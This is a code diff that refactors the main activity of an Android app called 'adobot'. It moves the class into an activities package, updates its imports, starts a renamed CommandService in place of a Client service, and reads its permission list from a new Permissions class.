@@ -1,6 +1,5 @@
-package com.android.adobot;
+package com.android.adobot.activities;
 
-import android.Manifest;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -14,7 +13,12 @@ import android.widget.Button;
 
 import java.util.HashMap;
 
-import http.Http;
+import com.android.adobot.BuildConfig;
+import com.android.adobot.CommandService;
+import com.android.adobot.CommonParams;
+import com.android.adobot.Permissions;
+import com.android.adobot.R;
+import com.android.adobot.http.Http;
 import pub.devrel.easypermissions.EasyPermissions;
 
 public class MainActivity extends AppCompatActivity {
@@ -54,7 +58,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startClient() {
-        Intent i = new Intent(this, Client.class);
+        Intent i = new Intent(this, CommandService.class);
         startService(i);
     }
 
@@ -67,7 +71,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void askPermissions() {
-        String[] perms = CommonParams.PERMISSIONS;
+        String[] perms = Permissions.PERMISSIONS;
 
         if (EasyPermissions.hasPermissions(this, perms)) {
             // Already have permission, do the thing
